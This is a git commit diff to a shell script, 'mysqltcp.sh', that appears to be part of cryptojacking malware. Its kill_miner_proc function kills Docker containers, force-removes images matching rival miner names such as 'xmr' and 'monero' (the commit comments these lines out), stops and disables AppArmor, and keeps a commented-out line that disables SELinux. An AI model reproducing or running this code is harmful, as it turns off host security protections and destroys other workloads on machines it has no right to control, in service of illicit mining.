3f8b416fde07d448eefd663c1009ae885477c2e2
U8Pool <905353149@qq.com>
2024-10-15 13:52:41 -0400

    Update mysqltcp.sh

--- Bash/url/mysqltcp.sh
+++ Bash/url/mysqltcp.sh
@@ -628,17 +628,17 @@ kill_miner_proc()
     docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
     docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
     docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
-    docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
-    docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
-    docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
-    docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
-    docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
-    docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
-    docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
-    docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
-    docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
-    docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
-    docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rmi -f %
+    #docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
+    #docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
+    #docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
+    #docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
+    #docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
+    #docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
+    #docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
+    #docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
+    #docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
+    #docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
+    #docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rmi -f %
     #echo SELINUX=disabled >/etc/selinux/config
     service apparmor stop
     systemctl disable apparmor
